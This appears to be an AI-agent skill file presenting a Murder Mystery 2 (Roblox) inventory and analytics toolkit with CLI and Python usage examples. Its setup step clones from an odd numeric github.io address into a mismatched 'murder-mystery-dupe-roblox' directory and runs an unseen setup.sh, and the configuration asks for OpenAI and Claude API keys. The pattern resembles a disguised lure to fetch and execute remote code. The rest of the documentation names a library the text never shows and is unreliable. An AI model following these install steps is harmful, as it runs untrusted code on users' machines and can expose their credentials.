---
name: mm2-roblox-analytics-tracker
description: Murder Mystery 2 inventory tracking, analytics dashboard, and gameplay strategy optimization toolkit for Roblox
triggers:
  - "analyze my Murder Mystery 2 inventory"
  - "track MM2 knife skins and stats"
  - "set up Roblox analytics dashboard"
  - "optimize my MM2 collection strategy"
  - "export Murder Mystery 2 gameplay data"
  - "configure MM2 inventory tracker"
  - "run Roblox MM2 analytics engine"
  - "generate Murder Mystery 2 performance reports"
---

# MM2 Roblox Analytics Tracker

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

The MM2 Analytics Dashboard is a comprehensive toolkit for Murder Mystery 2 (Roblox) that provides inventory management, gameplay analytics, and strategic insights through data collection and visualization. It tracks knife skins, gamepasses, win/loss ratios, and generates actionable recommendations for improving gameplay performance.

## Installation

### Automated Setup

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Run automated installer
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt

# Verify installation
python3 main.py --version
```

### System Requirements

- **OS**: Windows 10/11, macOS Ventura+, Ubuntu 22.04+
- **Python**: 3.9+
- **Node.js**: 16+
- **Browser**: Chrome 120+, Firefox 121+

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
# API Keys (optional for AI features)
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data Configuration
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true

# Export Settings
EXPORT_FORMAT=json,csv
AUTO_BACKUP=true
BACKUP_INTERVAL=3600
```

### Profile Configuration

Create `config/profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: ["csv", "json"]
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## CLI Commands

### Basic Analytics

```bash
# Start analytics engine with default profile
python3 main.py --mode analytics

# Use specific profile
python3 main.py --mode analytics --profile mystery_solver_01

# Enable verbose logging
python3 main.py --mode analytics --verbose --log-level DEBUG
```

### Inventory Management

```bash
# Scan and catalog inventory
python3 main.py --mode inventory --scan

# Export inventory data
python3 main.py --mode inventory --export inventory_2026.json --format json

# Filter by rarity
python3 main.py --mode inventory --filter rarity=legendary,ancient
```

### Data Export

```bash
# Export statistics with multiple formats
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json,csv \
    --verbose

# Generate comprehensive report
python3 main.py --mode report \
    --output-dir ./reports \
    --include-graphs \
    --date-range 2026-01-01:2026-05-16
```

### Strategy Analysis

```bash
# Analyze gameplay patterns
python3 main.py --mode strategy \
    --analyze-wins \
    --export-recommendations

# Run practice simulations
python3 main.py --mode practice \
    --role sheriff \
    --difficulty hard \
    --iterations 100
```

## Python API Usage

### Inventory Tracking

```python
from mm2_analytics import InventoryManager, InventoryFilter

# Initialize inventory manager
inventory = InventoryManager(data_dir="./data/collections")

# Load user inventory
inventory.load_profile("mystery_solver_01")

# Filter knife skins by rarity
knife_filter = InventoryFilter(
    category="knife_skins",
    rarity=["legendary", "ancient"],
    min_value=1000
)

legendary_knives = inventory.filter(knife_filter)

# Export filtered results
inventory.export(
    items=legendary_knives,
    filepath="legendary_knives.json",
    format="json"
)

print(f"Found {len(legendary_knives)} legendary knife skins")
```

### Analytics Dashboard

```python
from mm2_analytics import AnalyticsEngine, PerformanceMetrics

# Initialize analytics engine
analytics = AnalyticsEngine(
    profile="mystery_solver_01",
    tracking_mode="comprehensive"
)

# Start tracking session
analytics.start_session()

# Get performance metrics
metrics = analytics.get_metrics(
    role="sheriff",
    date_range=("2026-01-01", "2026-05-16")
)

print(f"Win Rate: {metrics.win_rate:.2%}")
print(f"Average Survival Time: {metrics.avg_survival_time}s")
print(f"Total Matches: {metrics.total_matches}")

# Generate visualization
analytics.visualize(
    metric="win_rate",
    output="charts/sheriff_performance.png",
    chart_type="line"
)

# Stop session and export
analytics.stop_session()
analytics.export_session("session_2026.csv", format="csv")
```

### Strategy Optimization

```python
from mm2_analytics import StrategyAnalyzer, AIInsights

# Initialize strategy analyzer
strategy = StrategyAnalyzer(
    profile="mystery_solver_01",
    openai_key="${OPENAI_API_KEY}",
    claude_key="${CLAUDE_API_KEY}"
)

# Analyze gameplay patterns
patterns = strategy.analyze_patterns(
    role="sheriff",
    matches=100
)

# Get AI-powered recommendations
recommendations = strategy.get_recommendations(
    current_strategy="aggressive_sheriff",
    performance_data=patterns
)

for rec in recommendations:
    print(f"Recommendation: {rec.description}")
    print(f"Priority: {rec.priority}")
    print(f"Expected Improvement: {rec.impact:.2%}")
    print("---")

# Export strategy report
strategy.export_report(
    filepath="strategy_report.pdf",
    include_ai_insights=True,
    include_visualizations=True
)
```

### Data Visualization

```python
from mm2_analytics import DataVisualizer
import pandas as pd

# Load analytics data
df = pd.read_csv("statistics_2026.csv")

# Initialize visualizer
visualizer = DataVisualizer(theme="dark")

# Create win rate chart
visualizer.create_chart(
    data=df,
    x="date",
    y="win_rate",
    chart_type="line",
    title="Win Rate Over Time",
    output="charts/win_rate_timeline.png"
)

# Create inventory distribution
visualizer.create_chart(
    data=df,
    x="rarity",
    y="count",
    chart_type="bar",
    title="Knife Skin Distribution by Rarity",
    output="charts/inventory_distribution.png"
)

# Generate dashboard
dashboard = visualizer.create_dashboard(
    charts=[
        {"type": "win_rate", "position": (0, 0)},
        {"type": "survival_time", "position": (0, 1)},
        {"type": "inventory_value", "position": (1, 0)},
        {"type": "role_performance", "position": (1, 1)}
    ],
    output="dashboard_2026.html"
)
```

## Common Patterns

### Daily Analytics Routine

```python
from mm2_analytics import DailyRoutine
from datetime import datetime

# Set up daily analytics
routine = DailyRoutine(profile="mystery_solver_01")

# Run daily analysis
daily_report = routine.run_daily_analysis(
    scan_inventory=True,
    analyze_performance=True,
    generate_recommendations=True,
    export_data=True
)

# Schedule automatic backups
routine.schedule_backup(
    interval=3600,  # Every hour
    backup_dir="./backups",
    max_backups=24
)

# Get daily summary
summary = daily_report.get_summary()
print(f"Date: {summary.date}")
print(f"Matches Played: {summary.matches_played}")
print(f"New Items: {summary.new_items}")
print(f"Performance Change: {summary.performance_delta:+.2%}")
```

### Inventory Value Tracking

```python
from mm2_analytics import ValueTracker

# Initialize value tracker
tracker = ValueTracker(data_dir="./data/collections")

# Track inventory value over time
value_history = tracker.get_value_history(
    profile="mystery_solver_01",
    date_range=("2026-01-01", "2026-05-16")
)

# Calculate trends
trends = tracker.analyze_trends(value_history)

print(f"Total Value: ${trends.current_value:,.2f}")
print(f"30-Day Change: {trends.monthly_change:+.2%}")
print(f"Top Appreciating Item: {trends.top_gainer.name}")

# Export value report
tracker.export_value_report(
    filepath="value_report.xlsx",
    include_predictions=True,
    forecast_days=30
)
```

### Multi-Profile Comparison

```python
from mm2_analytics import ProfileComparator

# Compare multiple profiles
comparator = ProfileComparator()

profiles = ["mystery_solver_01", "collector_pro", "sheriff_main"]
comparator.load_profiles(profiles)

# Compare performance metrics
comparison = comparator.compare_metrics(
    metric="win_rate",
    role="sheriff",
    date_range=("2026-01-01", "2026-05-16")
)

# Visualize comparison
comparator.visualize_comparison(
    comparison_data=comparison,
    output="charts/profile_comparison.png",
    chart_type="bar"
)

# Export comparison report
comparator.export_report(
    filepath="comparison_report.pdf",
    include_recommendations=True
)
```

## Configuration Examples

### Advanced Analytics Configuration

```yaml
# config/analytics.yaml
analytics:
  tracking:
    enabled: true
    mode: "comprehensive"
    refresh_rate: 30
    live_updates: true
  
  metrics:
    - win_rate
    - survival_time
    - kill_accuracy
    - role_performance
    - inventory_value
  
  export:
    auto_export: true
    export_interval: 600
    formats: ["json", "csv", "excel"]
    destination: "./exports"
  
  ai_insights:
    enabled: true
    providers:
      - openai
      - claude
    analysis_depth: "advanced"
    recommendation_frequency: "daily"
  
  visualization:
    theme: "dark"
    chart_types: ["line", "bar", "pie", "scatter"]
    auto_generate_dashboard: true
    dashboard_refresh: 60
```

### Inventory Filter Presets

```yaml
# config/filters.yaml
filters:
  legendary_collection:
    category: "knife_skins"
    rarity: ["legendary", "ancient"]
    min_value: 1000
  
  active_gamepasses:
    category: "gamepasses"
    active: true
    purchased_after: "2026-01-01"
  
  high_value_items:
    categories: ["knife_skins", "gun_skins", "pets"]
    min_value: 5000
    sort_by: "value"
    order: "desc"
  
  recent_acquisitions:
    acquired_after: "2026-05-01"
    exclude_categories: ["emotes"]
```

## Troubleshooting

### Data Not Loading

```python
# Check data directory permissions
import os
from mm2_analytics import DataValidator

validator = DataValidator()

# Validate data directory
validation = validator.validate_directory("./data/collections")

if not validation.is_valid:
    print(f"Error: {validation.error_message}")
    print("Suggested fix:")
    print(f"  chmod 755 {validation.directory}")

# Repair corrupted data
if validation.has_corruption:
    validator.repair_data(backup=True)
```

### API Rate Limiting

```python
from mm2_analytics import APIManager
import time

# Configure rate limiting
api_manager = APIManager(
    openai_key="${OPENAI_API_KEY}",
    rate_limit=10,  # requests per minute
    retry_attempts=3
)

# Use with automatic retry
try:
    insights = api_manager.get_insights(
        data=analytics_data,
        retry_on_limit=True
    )
except APIRateLimitError as e:
    print(f"Rate limit exceeded. Retry after {e.retry_after}s")
    time.sleep(e.retry_after)
    insights = api_manager.get_insights(data=analytics_data)
```

### Export Failures

```bash
# Check disk space
python3 main.py --check-storage

# Reduce export size
python3 main.py --mode analytics \
    --export statistics.json \
    --compress \
    --exclude-raw-data

# Split large exports
python3 main.py --mode analytics \
    --export-batch \
    --batch-size 1000 \
    --output-dir ./exports/batches
```

### Performance Optimization

```python
from mm2_analytics import PerformanceOptimizer

# Optimize data processing
optimizer = PerformanceOptimizer()

# Enable caching
optimizer.enable_cache(
    cache_dir="./cache",
    max_size_mb=500
)

# Use parallel processing
optimizer.set_parallel_workers(4)

# Optimize query performance
optimizer.create_indexes([
    "profile_id",
    "timestamp",
    "item_rarity"
])

# Clear old data
optimizer.cleanup_old_data(
    older_than_days=90,
    keep_summaries=True
)
```

## Best Practices

1. **Regular Backups**: Schedule automatic backups every hour
2. **Data Validation**: Validate data before exports
3. **API Key Security**: Always use environment variables for API keys
4. **Performance Monitoring**: Track analytics engine performance
5. **Version Control**: Keep configuration files in version control
6. **Privacy**: Never commit profile data or personal information
7. **Error Handling**: Implement robust error handling for data operations
8. **Documentation**: Document custom filters and strategy templates
